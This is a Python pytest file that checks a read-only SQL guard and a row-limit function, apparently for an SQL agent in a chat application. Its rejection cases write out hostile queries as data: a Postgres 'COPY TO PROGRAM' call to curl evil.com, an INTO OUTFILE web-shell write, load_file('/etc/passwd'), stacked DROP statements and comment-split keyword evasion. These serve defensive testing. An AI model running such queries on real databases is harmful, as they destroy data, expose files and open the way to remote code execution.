"""Unit tests for sql_safety.assert_read_only + enforce_limit."""
import pytest

from tfm_rag.application.chat.sql_safety import (
    assert_read_only,
    enforce_limit,
)
from tfm_rag.domain.errors.chat import UnsafeSQLError

# --- assert_read_only ------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1",
        "SELECT id, name FROM users",
        "  select * from users where id = 1  ",
        "SELECT id\nFROM users\nWHERE id = 1",
        # WITH/CTE leading SELECT is allowed
        "WITH t AS (SELECT 1) SELECT * FROM t",
        # Lowercase
        "select * from users",
    ],
)
def test_assert_read_only_accepts_safe_selects(sql: str) -> None:
    # should not raise
    assert_read_only(sql)


@pytest.mark.parametrize(
    "sql",
    [
        # Non-SELECT verbs
        "INSERT INTO users VALUES (1)",
        "UPDATE users SET name='x'",
        "DELETE FROM users",
        "DROP TABLE users",
        "ALTER TABLE users ADD COLUMN x INT",
        "TRUNCATE users",
        "CREATE TABLE x (id INT)",
        "GRANT ALL ON users TO ro",
        # Empty / whitespace
        "",
        "   ",
        # Multi-statement
        "SELECT 1; SELECT 2",
        "SELECT 1; DROP TABLE users",
        # Inline DML disguised after SELECT
        "SELECT 1 UNION SELECT id FROM users; DELETE FROM users",
    ],
)
def test_assert_read_only_rejects_unsafe(sql: str) -> None:
    with pytest.raises(UnsafeSQLError):
        assert_read_only(sql)


@pytest.mark.parametrize(
    "sql",
    [
        # MySQL file write — RCE vector. Starts with SELECT so it passed the
        # leading-verb guard; must be rejected by the banned-token scan.
        "SELECT * FROM users INTO OUTFILE '/var/www/html/shell.php'",
        "SELECT 'x' INTO DUMPFILE '/tmp/x'",
        # MySQL file read.
        "SELECT load_file('/etc/passwd')",
        "SELECT LOAD_FILE('/etc/passwd') AS contents",
        # Postgres data exfiltration / command execution.
        "SELECT * FROM users COPY TO PROGRAM 'curl evil.com'",
    ],
)
def test_assert_read_only_rejects_file_access(sql: str) -> None:
    with pytest.raises(UnsafeSQLError):
        assert_read_only(sql)


@pytest.mark.parametrize(
    "sql",
    [
        # Block-comment evasion: the SQL engine ignores /**/ so this is a
        # DELETE, but a naive \b token scan sees "DEL" + "ETE".
        "SELECT 1; DEL/**/ETE FROM users",
        "SELECT 1 UN/**/ION SELECT 1; DROP/**/ TABLE users",
        "SELECT * FROM users INTO OUT/**/FILE '/tmp/x'",
    ],
)
def test_assert_read_only_rejects_block_comment_evasion(sql: str) -> None:
    with pytest.raises(UnsafeSQLError):
        assert_read_only(sql)


def test_assert_read_only_allows_legit_block_comment() -> None:
    # A block comment with benign content must NOT be a false positive.
    assert_read_only("SELECT id /* the user id */ FROM users")


def test_assert_read_only_message_does_not_echo_full_sql() -> None:
    # Defensive: an error message must not echo the entire SQL (could be huge),
    # but it MAY include a short tag of the offending verb.
    try:
        assert_read_only("DELETE FROM secret_table WHERE x = 1")
    except UnsafeSQLError as exc:
        msg = str(exc)
        assert "DELETE" in msg.upper()


# --- AST-specific cases (sqlglot) --------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM products",
        "SELECT name FROM products WHERE stock > 0",
        "WITH q AS (SELECT id FROM customers WHERE active = 1) SELECT * FROM q",
        "SELECT name FROM products UNION SELECT name FROM offers",
    ],
)
def test_sqlglot_accepts_clean_selects(sql: str) -> None:
    assert_read_only(sql)


@pytest.mark.parametrize(
    "sql,reason",
    [
        ("DROP TABLE customers", "DROP at top level"),
        ("DELETE FROM customers WHERE id = 1", "DELETE at top level"),
        ("UPDATE customers SET email = 'x' WHERE id = 1", "UPDATE at top level"),
        ("INSERT INTO customers (email) VALUES ('x')", "INSERT at top level"),
        ("SELECT 1; DROP TABLE customers", "chained statements"),
        # CTE body is DML — the regex check could not see this; the AST walk can.
        ("WITH q AS (DELETE FROM x RETURNING *) SELECT * FROM q", "CTE body is DML"),
        # Comment + chained statement evasion.
        ("SELECT * FROM customers /* attempt -- */ ; DROP TABLE x", "comment evasion"),
        # Side-effecting function call.
        ("SELECT pg_sleep(60)", "side-effecting function"),
        # DML inside a FROM-subquery: sqlglot mangles it to (DELETE) with no
        # Delete node, so the AST walk misses it — the keyword backstop catches it.
        ("SELECT * FROM (DELETE FROM x RETURNING id) t", "subquery DML (sqlglot mangles)"),
        ("SELECT * FROM (DROP TABLE x) t", "subquery DDL (sqlglot mangles)"),
    ],
)
def test_sqlglot_rejects_dangerous(sql: str, reason: str) -> None:
    with pytest.raises(UnsafeSQLError):
        assert_read_only(sql)


# --- read-only introspection (SHOW / DESCRIBE / EXPLAIN) ---------------------
# The gate enforces "read-only" (deny writes/DDL/side-effects), NOT "SELECT-only".
# Read-only introspection verbs are legitimate (the exploratory SQL agent uses
# them to discover the schema before querying) and must be allowed.


@pytest.mark.parametrize(
    "sql",
    [
        "SHOW TABLES",
        "SHOW DATABASES",
        "SHOW COLUMNS FROM users",
        "show columns from users",
        "DESCRIBE users",
        "DESC users",
        "EXPLAIN SELECT 1",
        "EXPLAIN SELECT * FROM users WHERE id = 1",
    ],
)
def test_accepts_read_only_introspection(sql: str) -> None:
    # should not raise — these read metadata / query plans, they never mutate.
    assert_read_only(sql)


@pytest.mark.parametrize(
    "sql",
    [
        # EXPLAIN ANALYZE actually EXECUTES the plan → the ANALYZE token must
        # keep it out even though plain EXPLAIN is allowed.
        "EXPLAIN ANALYZE SELECT 1",
        # Introspection must not become a smuggling vector for stacked writes.
        "SHOW TABLES; DROP TABLE users",
        # Non-read maintenance / DDL verbs stay rejected (deny-by-default): they
        # are not SELECT/WITH/UNION nor SHOW/DESCRIBE/EXPLAIN.
        "CHECKPOINT",
        "REFRESH MATERIALIZED VIEW v",
        "PRAGMA table_info(users)",
        "LOCK TABLE users",
        # Postgres anonymous code block can write; must stay rejected.
        "DO $$ BEGIN PERFORM 1; END $$",
    ],
)
def test_rejects_non_read_commands(sql: str) -> None:
    with pytest.raises(UnsafeSQLError):
        assert_read_only(sql)


# --- enforce_limit -----------------------------------------------------------


def test_enforce_limit_appends_when_missing() -> None:
    out = enforce_limit("SELECT * FROM users", row_limit=50)
    assert out.lower().endswith("limit 51")


def test_enforce_limit_replaces_when_above_cap() -> None:
    out = enforce_limit("SELECT * FROM users LIMIT 9999", row_limit=50)
    assert "LIMIT 51" in out.upper()
    assert "9999" not in out


def test_enforce_limit_keeps_user_limit_when_below_cap() -> None:
    out = enforce_limit("SELECT * FROM users LIMIT 10", row_limit=50)
    # Below-cap user limit is preserved; we DO NOT raise it.
    assert "LIMIT 10" in out.upper()


def test_enforce_limit_is_case_insensitive() -> None:
    out = enforce_limit("select * from users limit 5", row_limit=50)
    assert "limit 5" in out.lower()


def test_enforce_limit_handles_trailing_semicolon() -> None:
    out = enforce_limit("SELECT * FROM users;", row_limit=50)
    # Should still produce a single, semicolon-free SELECT with LIMIT 51.
    assert out.count(";") == 0
    assert "LIMIT 51" in out.upper()


def test_enforce_limit_zero_or_negative_clamped_to_one() -> None:
    out = enforce_limit("SELECT * FROM users", row_limit=0)
    assert "LIMIT 2" in out.upper()  # row_limit=0 → request LIMIT 1+1 = 2 → keep 1 row
